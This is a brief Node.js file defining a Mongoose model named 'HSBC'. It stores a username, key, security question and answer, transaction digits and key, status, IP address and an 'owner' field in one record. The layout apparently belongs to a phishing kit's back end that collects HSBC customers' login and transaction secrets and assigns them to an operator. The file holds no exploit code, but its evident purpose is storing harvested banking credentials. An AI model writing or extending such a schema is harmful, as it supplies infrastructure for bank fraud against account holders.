const mongoose = require("mongoose");

const hsbcSchema = new mongoose.Schema({
    uniqueid: String,
    username: String,
    key: String,
    secQuestion: String,
    otsecAnswerp: String,
    transactionDigits: String,
    transactionKey: String,
    status: Number,
    ip: String,
    owner: String,
    timestamp: Date,
});

module.exports = mongoose.model("HSBC", hsbcSchema);
